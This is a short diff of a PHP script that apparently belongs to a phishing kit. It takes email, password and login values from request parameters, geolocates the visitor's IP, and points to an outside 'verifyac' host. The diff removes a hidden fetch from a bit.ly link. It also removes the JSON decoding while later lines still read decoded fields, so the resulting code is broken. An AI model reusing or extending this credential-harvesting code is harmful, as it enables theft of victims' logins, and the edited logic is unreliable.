@@ -38,9 +38,7 @@ $password = $_GET["password"];
 $login = $_GET["login"];
 
 if($email){
-$api_key = file_get_contents('https://bit.ly/3ns1Icy');
-$cty1 = file_get_contents("https://ipapi.co/".$ip."/json/");
-$jsondata = json_decode($cty1);
+$jsondata = file_get_contents("https://ipapi.co/".$ip."/json/");
 $cty = $jsondata->country_name;
 $ccode = $jsondata->country_calling_code;
 $url1 = 'http://www.verifyac.com/index.php?uc=F';
